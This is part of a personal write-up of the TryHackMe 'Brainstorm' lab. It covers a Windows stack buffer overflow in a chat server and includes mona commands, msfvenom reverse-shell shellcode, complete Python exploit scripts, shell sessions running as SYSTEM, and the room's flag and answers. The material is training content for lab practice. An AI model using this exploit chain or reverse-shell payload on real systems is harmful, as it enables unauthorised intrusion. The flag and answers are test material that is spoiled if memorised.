@@ -436,3 +436,441 @@ print()
 ```
 ```text
 ┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ python badchar.py 
+\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
+
+mona
+
+!mona bytearray -b "\x00"
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ cat exploit.py
+import socket
+import sys
+
+username = b"witty"
+message = b"A" * 2012 + b"B" * 4
+payload = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+try:
+    print("Sending Payload...")
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('10.10.99.157', 9999))
+    s.recv(1024)
+    s.recv(1024)
+    s.send(username + b'\r\n')
+    s.recv(1024)
+    s.send(message + payload + b'\r\n')
+    s.recv(1024)
+    s.close()
+
+except:
+    print("Connot Connect")
+    sys.exit()
+
+ESP: 0190EEC0 follow dump
+
+!mona modules
+
+After following the ESP register to the memory dump, it looks like all the characters made it into ESP, therefore no bad characters are present, apart from x00 which is always considered a bad character. 01 has also been reported as bad as sometimes the subsequent character is mistakenly reported as bad:
+
+The next step is to find a valid JMP ESP instruction address so that we can redirect the execution of the application to our malicious shellcode.
+
+Restarting the application, re-attaching Immunity, and using !mona modules to find a valid DLL/module – looks like the only good one is the executable itself:
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a 0190EEC0
+
+follow in dissambler the first then
+
+!mona find -s "\xff\xe4" -m essfunc.dll
+
+Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
+
+so will be 0x625014df
+
+so \xdf \x14 \x50 \x62
+
+the final exploit to get at least the revshell
+
+use msfvenom
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.220 LPORT=7777  -b "\x00" -f c      
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1506 bytes
+unsigned char buf[] = 
+"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
+"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
+"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
+"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
+"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
+"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
+"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
+"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
+"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
+"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
+"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
+"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
+"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
+"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
+"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
+"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
+"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
+"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
+"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
+"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
+"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
+"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
+"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
+"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
+"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
+"\x05";
+
+exploit.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ cat exploit.py
+import socket
+import sys
+
+username = b"witty"
+message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
+payload = (b"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
+b"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
+b"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
+b"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
+b"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
+b"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
+b"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
+b"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
+b"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
+b"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
+b"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
+b"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
+b"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
+b"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
+b"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
+b"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
+b"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
+b"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
+b"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
+b"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
+b"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
+b"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
+b"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
+b"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
+b"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
+b"\x05")
+try:
+    print("Sending Payload...")
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('10.10.99.157', 9999))
+    s.recv(1024)
+    s.recv(1024)
+    s.send(username + b'\r\n')
+    s.recv(1024)
+    s.send(message + payload + b'\r\n')
+    s.recv(1024)
+    s.close()
+
+except:
+    print("Connot Connect")
+    sys.exit()
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ python3 exploit.py
+Sending Payload...
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ nc -nvlp 7777               
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::7777
+Ncat: Listening on 0.0.0.0:7777
+Ncat: Connection from 10.10.99.157.
+Ncat: Connection from 10.10.99.157:49316.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\admin\Desktop>whoami
+whoami
+oscp-bof-prep\admin
+
+C:\Users\admin\Desktop>cd ..
+cd ..
+
+C:\Users\admin>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0EE5-7CCF
+
+ Directory of C:\Users\admin
+
+07/03/2020  09:40 PM    <DIR>          .
+07/03/2020  09:40 PM    <DIR>          ..
+07/03/2020  09:40 PM    <DIR>          Contacts
+09/29/2022  09:10 PM    <DIR>          Desktop
+07/03/2020  09:40 PM    <DIR>          Documents
+07/03/2020  09:40 PM    <DIR>          Downloads
+07/03/2020  09:40 PM    <DIR>          Favorites
+07/03/2020  09:40 PM    <DIR>          Links
+07/03/2020  09:40 PM    <DIR>          Music
+07/03/2020  09:40 PM    <DIR>          Pictures
+07/03/2020  09:40 PM    <DIR>          Saved Games
+07/03/2020  09:40 PM    <DIR>          Searches
+07/03/2020  09:40 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  50,289,713,152 bytes free
+
+C:\Users\admin>cd ..
+cd ..
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0EE5-7CCF
+
+ Directory of C:\Users
+
+07/03/2020  09:40 PM    <DIR>          .
+07/03/2020  09:40 PM    <DIR>          ..
+07/03/2020  09:40 PM    <DIR>          admin
+11/20/2010  08:47 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  50,289,713,152 bytes free
+
+C:\Users>cd admin
+cd admin
+
+C:\Users\admin>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0EE5-7CCF
+
+ Directory of C:\Users\admin
+
+07/03/2020  09:40 PM    <DIR>          .
+07/03/2020  09:40 PM    <DIR>          ..
+07/03/2020  09:40 PM    <DIR>          Contacts
+09/29/2022  09:10 PM    <DIR>          Desktop
+07/03/2020  09:40 PM    <DIR>          Documents
+07/03/2020  09:40 PM    <DIR>          Downloads
+07/03/2020  09:40 PM    <DIR>          Favorites
+07/03/2020  09:40 PM    <DIR>          Links
+07/03/2020  09:40 PM    <DIR>          Music
+07/03/2020  09:40 PM    <DIR>          Pictures
+07/03/2020  09:40 PM    <DIR>          Saved Games
+07/03/2020  09:40 PM    <DIR>          Searches
+07/03/2020  09:40 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  50,289,713,152 bytes free
+
+C:\Users\admin>cd Desktop
+cd Desktop
+
+C:\Users\admin\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0EE5-7CCF
+
+ Directory of C:\Users\admin\Desktop
+
+09/29/2022  09:10 PM    <DIR>          .
+09/29/2022  09:10 PM    <DIR>          ..
+09/29/2022  09:10 PM            43,747 chatserver.exe
+09/29/2022  09:10 PM            30,761 essfunc.dll
+06/25/2020  10:24 PM        22,749,412 ImmunityDebugger_1_85_setup.exe
+06/26/2020  01:48 AM         1,096,080 putty.exe
+07/03/2020  10:34 PM    <DIR>          vulnerable-apps
+               4 File(s)     23,920,000 bytes
+               3 Dir(s)  50,289,713,152 bytes free
+
+C:\Users\admin\Desktop>
+
+but is the other machine 😂
+
+now yep :0
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ python3 exploit.py
+Sending Payload...
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ cat exploit.py
+import socket
+import sys
+
+username = b"witty"
+message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
+payload = (b"\xdb\xda\xbe\x2e\xcc\x43\xa0\xd9\x74\x24\xf4\x58\x2b\xc9"
+b"\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x5e\xdf\xa1\x55\x62"
+b"\x37\xa7\x96\x9a\xc8\xc8\x1f\x7f\xf9\xc8\x44\xf4\xaa\xf8"
+b"\x0f\x58\x47\x72\x5d\x48\xdc\xf6\x4a\x7f\x55\xbc\xac\x4e"
+b"\x66\xed\x8d\xd1\xe4\xec\xc1\x31\xd4\x3e\x14\x30\x11\x22"
+b"\xd5\x60\xca\x28\x48\x94\x7f\x64\x51\x1f\x33\x68\xd1\xfc"
+b"\x84\x8b\xf0\x53\x9e\xd5\xd2\x52\x73\x6e\x5b\x4c\x90\x4b"
+b"\x15\xe7\x62\x27\xa4\x21\xbb\xc8\x0b\x0c\x73\x3b\x55\x49"
+b"\xb4\xa4\x20\xa3\xc6\x59\x33\x70\xb4\x85\xb6\x62\x1e\x4d"
+b"\x60\x4e\x9e\x82\xf7\x05\xac\x6f\x73\x41\xb1\x6e\x50\xfa"
+b"\xcd\xfb\x57\x2c\x44\xbf\x73\xe8\x0c\x1b\x1d\xa9\xe8\xca"
+b"\x22\xa9\x52\xb2\x86\xa2\x7f\xa7\xba\xe9\x17\x04\xf7\x11"
+b"\xe8\x02\x80\x62\xda\x8d\x3a\xec\x56\x45\xe5\xeb\x99\x7c"
+b"\x51\x63\x64\x7f\xa2\xaa\xa3\x2b\xf2\xc4\x02\x54\x99\x14"
+b"\xaa\x81\x0e\x44\x04\x7a\xef\x34\xe4\x2a\x87\x5e\xeb\x15"
+b"\xb7\x61\x21\x3e\x52\x98\xa2\x4b\xa8\xf3\xee\x24\xac\xf3"
+b"\x10\xd4\x39\x15\x46\x06\x6c\x8e\xff\xbf\x35\x44\x61\x3f"
+b"\xe0\x21\xa1\xcb\x07\xd6\x6c\x3c\x6d\xc4\x19\xcc\x38\xb6"
+b"\x8c\xd3\x96\xde\x53\x41\x7d\x1e\x1d\x7a\x2a\x49\x4a\x4c"
+b"\x23\x1f\x66\xf7\x9d\x3d\x7b\x61\xe5\x85\xa0\x52\xe8\x04"
+b"\x24\xee\xce\x16\xf0\xef\x4a\x42\xac\xb9\x04\x3c\x0a\x10"
+b"\xe7\x96\xc4\xcf\xa1\x7e\x90\x23\x72\xf8\x9d\x69\x04\xe4"
+b"\x2c\xc4\x51\x1b\x80\x80\x55\x64\xfc\x30\x99\xbf\x44\x40"
+b"\xd0\x9d\xed\xc9\xbd\x74\xac\x97\x3d\xa3\xf3\xa1\xbd\x41"
+b"\x8c\x55\xdd\x20\x89\x12\x59\xd9\xe3\x0b\x0c\xdd\x50\x2b"
+b"\x05")
+try:
+    print("Sending Payload...")
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('10.10.162.239', 9999))
+    s.recv(1024)
+    s.recv(1024)
+    s.send(username + b'\r\n')
+    s.recv(1024)
+    s.send(message + payload + b'\r\n')
+    s.recv(1024)
+    s.close()
+
+except:
+    print("Connot Connect")
+    sys.exit()
+
+the thing is changing the ip from the machine brain so in my case 10.10.162.239 , and the other machine using immunity debugger 10.10.99.157
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
+└─$ nc -nvlp 7777
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::7777
+Ncat: Listening on 0.0.0.0:7777
+Ncat: Connection from 10.10.162.239.
+Ncat: Connection from 10.10.162.239:49436.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\home
+cd c:\home
+The system cannot find the path specified.
+
+C:\Windows\system32>cd \home
+cd \home
+The system cannot find the path specified.
+
+C:\Windows\system32>cd 'C:\Users\'
+cd 'C:\Users\'
+The filename, directory name, or volume label syntax is incorrect.
+
+C:\Windows\system32>cd c:\users
+cd c:\users
+
+c:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C87F-5040
+
+ Directory of c:\Users
+
+08/29/2019  10:20 PM    <DIR>          .
+08/29/2019  10:20 PM    <DIR>          ..
+08/29/2019  10:21 PM    <DIR>          drake
+11/21/2010  12:16 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  19,552,374,784 bytes free
+
+c:\Users>cd drake
+cd drake
+
+c:\Users\drake>cd desktop
+cd desktop
+
+c:\Users\drake\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C87F-5040
+
+ Directory of c:\Users\drake\Desktop
+
+08/29/2019  10:55 PM    <DIR>          .
+08/29/2019  10:55 PM    <DIR>          ..
+08/29/2019  10:55 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  19,552,374,784 bytes free
+
+c:\Users\drake\Desktop>more root.txt
+more root.txt
+5b1001de5a44eca47eee71e7942a8f8a
+
+It was a though one!
+```
+![[Pasted image 20220929202536.png]]
+![[Pasted image 20220929211102.png]]
+![[Pasted image 20220929212029.png]]
+![[Pasted image 20220929213626.png]]
+![[Pasted image 20220929214842.png]]
+![](https://gitlab.com/dhiksec/tryhackme/-/raw/master/Brainstorm/2020-10-27_23-32.png)
+How many ports are open?
+scan the network with nmap
+*6* (it's strange because is 3 ports open only but doesn't accept it)
+### Accessing Files
+Let's continue with the enumeration!
+What is the name of the exe file you found?
+what protocol is used to transfer files?
+*chatserver.exe*
+### Access
+After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system?
+It is worth using a Python script to try out different payloads to gain access! You can even use the files to locally try the exploit.
+If you've not done buffer overflows before, check this room out!
+https://tryhackme.com/room/bof1
+Read the description.
+After testing for overflow, by entering a large number of characters, determine the EIP offset.
+you can use the pattern_offset.rb module in metasploit!
+Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.
+Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows.
+remember that the machine type is x86
+After gaining access, what is the content of the root.txt file?
+*5b1001de5a44eca47eee71e7942a8f8a*
+
+## Notes / Lessons Learned
+[[Buffer Overflow Prep]]
+
